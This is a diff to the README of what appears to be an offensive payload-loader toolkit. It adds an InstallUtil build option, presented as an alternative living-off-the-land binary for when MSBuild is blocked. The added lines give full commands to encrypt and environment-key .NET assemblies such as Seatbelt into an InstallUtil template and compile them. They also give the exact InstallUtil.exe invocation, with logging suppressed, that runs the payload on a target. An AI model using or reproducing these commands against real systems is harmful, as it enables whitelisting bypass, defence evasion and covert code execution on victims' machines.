@@ -49,6 +49,7 @@ All C++ loaders support both EXE and DLL invocation via compile-time `targetType
 | File | Description |
 |------|-------------|
 | `build_msbuild.py` | One-command build: encrypts assembly and injects into MSBuild template |
+| `build_installutil.py` | One-command build: encrypts assembly and injects into InstallUtil template |
 | `encrypt_payload.py` | XOR/AES encryptor — outputs C# byte arrays, raw binary, or hex |
 | `pipe_client.py` | Operator-side named pipe client for sending assemblies to the pipe listener |
 
@@ -146,6 +147,27 @@ python pipe_client.py shrimploader MyLib.dll --key <hex> --iv <hex> --type NS.Cl
 
 # Shut down the listener
 python pipe_client.py shrimploader --quit
+```
+
+### InstallUtil Payload (alternative LOLBin if MSBuild is blocked)
+
+```bash
+# One-command build (same flags as build_msbuild.py)
+python build_installutil.py Seatbelt.exe -- -group=all
+
+# Auto-compile to DLL with Mono
+python build_installutil.py Seatbelt.exe --compile -- -group=all
+
+# DLL, keying, XOR — all work the same way
+python build_installutil.py MyLib.dll --type Namespace.Class --method Run --compile
+python build_installutil.py Seatbelt.exe --keying hostname=WS01,domain=CORP --compile -- -group=all
+python build_installutil.py Seatbelt.exe -e xor --compile -- -group=all
+
+# Or compile manually
+mcs -target:library -r:System.Configuration.Install -out:payload.dll payload_ready.cs
+
+# On target:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
 ```
 
 ### Supported Assembly Types
